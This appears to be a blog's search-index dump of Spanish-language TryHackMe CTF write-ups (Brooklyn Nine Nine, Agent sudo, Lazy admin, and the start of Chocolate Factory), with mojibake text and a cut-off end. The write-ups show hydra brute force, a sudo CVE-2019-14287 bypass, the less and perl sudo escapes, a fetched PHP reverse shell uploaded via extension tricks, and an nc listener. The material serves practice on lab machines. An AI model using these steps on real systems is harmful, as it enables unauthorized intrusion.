allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.100.94 5 â”‚ [*] Open ports: 21,22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p21,22,80 -sC -sV 10.10.243.15 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.10.10 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 167fa2ffe0fba98777d6d3eb62572c6a3 (RSA) | 256 2e3b61594bc429ba5e858396f6fe99bee (ECDSA) |_ 256 ab162e79203c9b0a019c8c4426015a804 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.29 (Ubuntu) ParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 21 El nmap reporto que nos podemos conectar al puerto 21 como anonymous (ftp-anon: Anonymous FTP login allowed)\nDentro hay un archivo llamado note_to_jake.txt que nos lo podemos pasar a nuestra mÃ¡quina con get note_to_jake.txt\nContenido note_to_jake.txt Dentro del archivo note_to_jake.txt hay el siguiente mensaje\nFrom Amy,\nJake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine\nDe Amy,\nJake por favor cambia tu contraseÃ±a. Es demasiado dÃ©bil y Holt se enojarÃ¡ si alguien piratea el nueve nueve.\nViendo este mensaje vemos que hay tres usuarios:\nAmy Holt Jake InfiltraciÃ³n Amy dice que la contraseÃ±a de Jake es demasiado dÃ©bil, sabiendo esto podemos intentar con hyra hacer fuerza bruta al ssh como jake.\nHydra se considera el software para ciberseguridad estÃ¡ndar para ejecutar ataques de fuerza bruta en cuentas de servicios.\nâ¯ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.92.221 ssh -t 40 [22][ssh] host: 10.10.84.47 login: jake password: --------- Ahora ya nos podemos conectar por ssh como jake\nssh jake@10.10.84.47 Tratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm user.txt En el directorio /home/jake y /home/amy no hay nada, pero en el /home/holt estÃ¡ el user.txt\nEscalada de privilegios â¯ sudo -l User jake may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /usr/bin/less Â¿QuÃ© es less? Less es un programa similar a more, pero que permite retroceder movimiento en el archivo, asi como el movimiento hacia adelante. ademÃ¡s, menos no tiene que leer todo el archivo de entrada antes de comenzar, por lo que con archivos de entrada grandes, se inicia mÃ¡s rÃ¡pido que los editores de texto como vi\nÂ¿Como escalar con less? Si el binario puede ejecutarse como superusuario sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.\nLo primero es ejecutar less con sudo y especificarle un archivo que queremos leer, por ejemplo user.txt\nsudo less user.txt DespuÃ©s si escribimos !/bin/bash y le damos a enter, ya somos root\nroot@brookly_nine_nine:/home/holt# whoami root ","date":"2022-12-17","id":121,"permalink":"/writeups/tryhackme/brooklyn-nine-nine/","summary":"https://tryhackme.com/room/brooklynninenine\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.243.15\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","Fuerza bruta","less"],"title":"Brooklyn Nine Nine"},{"content":"","date":"2022-12-17","id":122,"permalink":"/tags/less/","summary":"","tags":[],"title":"less"},{"content":"Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. Â¡Que te diviertas!\nhttps://tryhackme.com/room/agentsudoctf\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.92.221\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127.854/127.854/127.854/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nâ¯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.92.221 -oG allPort ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.92.221 5 â”‚ [*] Open ports: 21,22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ nmap -p21,22,80 -sC -sV 10.10.92.221 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef1f5d04d4779506d6072ecf058f2cc07 (RSA) | 256 5e02d19ac4e7430662c19e25848aed7ea (ECDSA) |_ 256 2d005cdb9fda8c8d880e3924f8b4f18e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Annoucement |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ParÃ¡metro FunciÃ³n -p21,22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 80 Hay una web con el siguiente texto en la pÃ¡gina principal:\nDear agents,\nUse your own codename as user-agent to access the site.\nFrom, Agent R\nEstimados agentes,\nUtilice su propio nombre en clave como agente de usuario para acceder al sitio.\nDe, Agente R\nSegÃºn el texto podemos usar el \u0026ldquo;nombre en clave\u0026rdquo; como \u0026ldquo;user agent\u0026rdquo;. Vemos que estÃ¡ firmado como Agente R, se puede suponer que los agentes tienen una letra como nombre en clave. Con curl -A \u0026quot;A\u0026quot; 10.10.92.221 podemos ver la web como Agente A, pero ir probando asÃ­ hasta la z se puede hacer eterno, para eso e echo un script en python que atomatiza el proceso de las peticiones y guarda las repuestas distintas.\nUser-Agent o tambiÃ©n conocido como Agente de Usuario es una cabecera de texto que sirve para identificar al usuario que entra en una pÃ¡gina web a travÃ©s del navegador.\nfrom pwn import * import requests, signal, time, pbd, sys, string, os main_url = \u0026#34;http://10.10.92.221\u0026#34; characters = string.ascii_uppercase standard = requests.get(main_url) different = \u0026#34;\u0026#34; p1 = log.progress(\u0026#34;Trying with Agent\u0026#34;) p2 = log.progress(\u0026#34;Agents with different response\u0026#34;) for i in characters: headers = { \u0026#39;User-Agent\u0026#39;: i } response = requests.get(main_url, headers=headers) p1.status(i) if response.text != standard.text: different += \u0026#34; {},\u0026#34;.format(i) p2.status(different) f = open (\u0026#39;agent_{}.txt\u0026#39;.format(i) ,\u0026#39;w\u0026#39;) f.write(response.text) print(\u0026#34;\\n[*] Result saved on agent_{}.txt\u0026#34;.format(i)) f.close() Al ejecutarlo encuentra respuestas distintas con el Agente C y el Agente R\nâ¯ python3 script.py [*] Trying with Agent: Z [*] Agents with different response: C, R, [*] Result saved on agent_C.txt [*] Result saved on agent_R.txt Dentro del agente_C.txt hay el siguiente mensaje\nDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!\nÂ¿TodavÃ­a recuerdas nuestro trato? Por favor, dÃ­gale al agente J sobre las cosas lo antes posible. AdemÃ¡s, cambia tu maldita contraseÃ±a, Â¡es dÃ©bil!\nComo dice que su contraseÃ±a es dÃ©bil con hydra vamos a intentar encontrarla usando un diccionario.\nHydra se considera el software para ciberseguridad estÃ¡ndar para ejecutar ataques de fuerza bruta en cuentas de servicios.\nhydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.92.221 -t 40 ParÃ¡metro FunciÃ³n -l Usuario -P Diccionario -t Velocidad InfiltraciÃ³n Puerto 21 El hydra encuentra la contraseÃ±a y ya podemos conectarnos por ftp como chris, dentro hay 3 archivos: To_agentJ.txt, cute-alien.jpg y cutie.png. Con get archivo nos los podemos pasar a nuestra mÃ¡quina.\nContenido de To_agentJ.txt\nDear agent J,\nAll these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026rsquo;t be a problem for you.\nFrom, Agent C\nEstimado agente J,\nÂ¡Todas estas fotos alienÃ­genas son falsas! El Agente R almacenÃ³ la imagen real dentro de su directorio. Su contraseÃ±a de inicio de sesiÃ³n se almacena de alguna manera en la imagen falsa. No deberÃ­a ser un problema para ti.\nDe, Agente C\ncute-alien.jpg El Agente C dice que dentro de esta foto hay la contraseÃ±a de inicio de session del Agente J. Con steghide podemos intentar ver su contenido\nâ¯ steghide extract -sf cute-alien.jpg Anotar salvoconducto: steghide: ï¿½no pude extraer ningï¿½n dato con ese salvoconducto! No encuentra nada sin indicar salvoconducto. Para ello vamos a usar esta herramienta: https://github.com/RickdeJager/stegseek para atraves de un diccionario poder conseguir el contenido oculto de la foto.\nâ¯ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: \u0026#34;Area51\u0026#34; [i] Original filename: \u0026#34;message.txt\u0026#34;. [i] Extracting to \u0026#34;cute-alien.jpg.out\u0026#34;. message.txt Contenido del archivo message.txt renombrado a cute-alien.jpg.out\nHi james,\nGlad you find this message. Your login password is censored!\nDon\u0026rsquo;t ask me why the password look cheesy, ask agent R who set this password for you.\nYour buddy, chris\nHola James,\nMe alegro de que encuentres este mensaje. Â¡Su contraseÃ±a de inicio de sesiÃ³n es censurado!\nNo me pregunte por quÃ© la contraseÃ±a parece cursi, pregÃºntele al agente R quiÃ©n estableciÃ³ esta contraseÃ±a para usted.\nTu amigo, cris\nPuerto 22 Ahora ya tenemos las credenciales de james y nos podemos conectar por ssh\nYa podemos ver la flag de user.txt\nEscalada de privilegios con sudo -l podemos ver que puede ejecutar como root\njames@agent-sudo:~$ sudo -l User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash E buscado el (ALL, !root) /bin/bash en google y e encontrado que esto es porque el sudo tiene una versiÃ³n menor a la 1.8.27 lo que lo hace vulnerable. Se puede confirmar con:\njames@agent-sudo:~$ sudo --version Sudo version 1.8.21p2 En el exploit (https://www.exploit-db.com/exploits/47502) lo que pone es que podemos ejecutar cosas con sudo de la siguiente forma:\nsudo -u#-1 /bin/bash\nDe echo ejecutando eso ya somos root y podemos ver la flag en el /root/root.txt\n","date":"2022-12-15","id":123,"permalink":"/writeups/tryhackme/agent-sudo/","summary":"Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. Â¡Que te diviertas!\nhttps://tryhackme.com/room/agentsudoctf\nIP Atacante = 10.","tags":["CTF","FÃ¡cil","Linux","Fuerza bruta","CVE-2019-14287","Archivos ocultos"],"title":"Agent sudo"},{"content":"","date":"2022-12-15","id":124,"permalink":"/tags/archivos-ocultos/","summary":"","tags":[],"title":"Archivos ocultos"},{"content":"","date":"2022-12-15","id":125,"permalink":"/tags/cve-2019-14287/","summary":"","tags":[],"title":"CVE-2019-14287"},{"content":"","date":"2022-12-14","id":126,"permalink":"/tags/hash-md5/","summary":"","tags":[],"title":"hash md5"},{"content":"MÃ¡quina fÃ¡cil Linux para practicar tus habilidades.\nhttps://tryhackme.com/room/lazyadmin\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.192.128\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.192.128 PING 10.10.192.128 (10.10.192.128) 56(84) bytes of data. 64 bytes from 10.10.192.128: icmp_seq=1 ttl=63 time=66.1 ms --- 10.10.192.128 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 66.057/66.057/66.057/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.192.128 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPorts Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.29.188 5 â”‚ [*] Open ports: 22,80 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\nâ¯ sudo nmap -p22,80 -sC -sV 10.10.192.128 -Pn target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 497cf741104373da2ce63s89586f8e0f0 (RSA) | 256 2fd7c44ce81b5sa9044dfc0638c72ae55 (ECDSA) |_ 256 6184622s7c6c32917dd27459e29cb905e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ParÃ¡metro FunciÃ³n -p22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 80 Al entrar a la web lo primero que se ve es lo siguiente\nBuscando subdirectorios Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que estÃ¡ en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.192.128/FUZZ ======================================================================= ID Response Lines Word Chars Payload ======================================================================= 000000075: 301 9 L 28 W 316 Ch \u0026#34;content\u0026#34; 000095524: 403 9 L 28 W 278 Ch \u0026#34;server-status\u0026#34; ParÃ¡metro FunciÃ³n -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no nos reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario Dentro de /content solo hay un texto\nTraducciÃ³n: Bienvenido a SweetRice - Gracias por instalar SweetRice como su sistema de administraciÃ³n de sitios web. Este sitio se estÃ¡ construyendo ahora, por favor llegue tarde. Si usted es el webmaster, vaya a Dashboard -\u0026gt; General -\u0026gt; ConfiguraciÃ³n del sitio web y desmarque la casilla de verificaciÃ³n \u0026ldquo;Cerrar sitio\u0026rdquo; para abrir su sitio web. MÃ¡s ayuda en Consejo para Basic CMS SweetRice instalado\nBuscando subdirectorios en /content/ â¯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.192.128/content/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000016: 301 9 L 28 W 323 Ch \u0026#34;images\u0026#34; 000000953: 301 9 L 28 W 319 Ch \u0026#34;js\u0026#34; 000002190: 301 9 L 28 W 320 Ch \u0026#34;inc\u0026#34; 000003320: 301 9 L 28 W 319 Ch \u0026#34;as\u0026#34; 000003601: 301 9 L 28 W 324 Ch \u0026#34;_themes\u0026#34; 000003808: 301 9 L 28 W 327 Ch \u0026#34;attachment\u0026#34; Credenciales Inicio Session Dentro del /inc hay una carpeta llamada mysql_backup/ dentro hay un archivo llamado mysql_bakup_20191129023059-1.5.1.sql nos lo descargamos, dentro se puede ver un usuario llamado manager con un hash --------------\nâ¯ hash-identifier -------------- Possible Hashs: [+] MD5 Para ver el contenido vamos a usar John the Ripper\nJohn The Ripper es una herramienta de cÃ³digo abierto para la recuperaciÃ³n y auditorÃ­a de seguridad en contraseÃ±as, ademÃ¡s de ser multiplataforma, es el mÃ¡s utilizado y versÃ¡til, ya que combina una velocidad de â€œcraqueoâ€ rÃ¡pida, con una extraordinaria gama de tipos de hash compatibles.\nâ¯ sudo john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3]) Warning: no OpenMP support for this hash type, consider --fork=8 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Password Censurada (?) 1g 0:00:00:00 DONE (2022-12-14 21:28) 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s 062089..redlips Session completed. Ahora ya podemos iniciar sessiÃ³n en el panel de login que estÃ¡ en /content/as\nCon esto entramos a un directorio que parece ser el panel de control del administrador, hay muchos apartados, pero hay uno (media center) En el cual podemos subir archivos.\nReverse shell Vamos a intentar subir un archivo.php malicioso echo por pentestmonkey para crear una reverse shell\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Importante cambiar esto con la ip de nuestra mÃ¡quina y el puerto en el que vamos a estar en escucha\n$ip = \u0026#39;10.10.10.10\u0026#39;; // CHANGE THIS $port = 443; // CHANGE THIS Ahora ya lo podemos subir\nNo se ha subido, puede ser que al ser .php lo haya bloqueado\u0026hellip; En estas situaciones, se puede intentar con extensiones menos tÃ­picas de php que el admin no haya bloqueado.\nEjemplos de alternativas a .php: .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\nPrimero vamos a probar con .phtml\nÂ¡Ahora si!\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Clicamos el archivo que hemos subido anteriormente a la web y recibimos la conexiÃ³n\nTratamiento de la tty Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada de privilegios Con sudo -l se puede ver que podemos ejecutar /usr/bin/perl y /home/itguy/backup.pl\nSi vamos al /home/itguy/, y hacemos un cat a backup.pl se ve que ejecuta un archivo que estÃ¡ en /etc/copy.sh\n(Contenido backup.pl)\n#!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;); En este archivo no tenemos permisos de escritura, pero en el copy.sh sÃ­. Vamos a hacer una prueba para ver si lo que ponemos en copy.sh se ejecuta como root\nwww-data@THM-Chal:/$ echo \u0026#34;whoami\u0026#34; \u0026gt; /etc/copy.sh www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl root Efectivamente se ejecuta como root, ahora vamos a decirle al copy.sh que spawnee una bash\nwww-data@THM-Chal:/$ echo \u0026#34;/bin/bash -i\u0026#34; \u0026gt; /etc/copy.sh www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl root@THM-Chal:/# Â¡Ya somos root!\nCon un cat /root/root.txt podemos ver la flag\n","date":"2022-12-14","id":127,"permalink":"/writeups/tryhackme/lazy-admin/","summary":"MÃ¡quina fÃ¡cil Linux para practicar tus habilidades.\nhttps://tryhackme.com/room/lazyadmin\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.192.128\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene","tags":["CTF","FÃ¡cil","Linux","Archivos ocultos","hash md5","file upload"],"title":"Lazy admin"},{"content":"Un ctf temÃ¡tica de Charlie y la fÃ¡brica de chocolate, vuelve a visitar la fÃ¡brica de chocolate de Willy Wonka.\nhttps://tryhackme.com/room/chocolatefactory\nPara empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nIP Atacante = 10.10.10.10\nIP vÃ­ctima = 10.10.250.47\nâ¯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nâ¯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.250.47 -oG allPort PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 63 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 100/tcp open newacct syn-ack ttl 63 101/tcp open hostname syn-ack ttl 63 102/tcp open iso-tsap syn-ack ttl 63 103/tcp open gppitnp syn-ack ttl 63 104/tcp open acr-nema syn-ack ttl 63 105/tcp open csnet-ns syn-ack ttl 63 106/tcp open pop3pw syn-ack ttl 63 107/tcp open rtelnet syn-ack ttl 63 108/tcp open snagas syn-ack ttl 63 109/tcp open pop2 syn-ack ttl 63 110/tcp open pop3 syn-ack ttl 63 111/tcp open rpcbind syn-ack ttl 63 112/tcp open mcidas syn-ack ttl 63 113/tcp open ident syn-ack ttl 63 114/tcp open audionews syn-ack ttl 63 115/tcp open sftp syn-ack ttl 63 116/tcp open ansanotify syn-ack ttl 63 117/tcp open uucp-path syn-ack ttl 63 118/tcp open sqlserv syn-ack ttl 63 119/tcp open nntp syn-ack ttl 63 120/tcp open cfdptkt syn-ack ttl 63 121/tcp open erpc syn-ack ttl 63 122/tcp open smakynet syn-ack ttl 63 123/tcp open ntp syn-ack ttl 63 124/tcp open ansatrader syn-ack ttl 63 125/tcp open locus-map syn-ack ttl 63 ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de 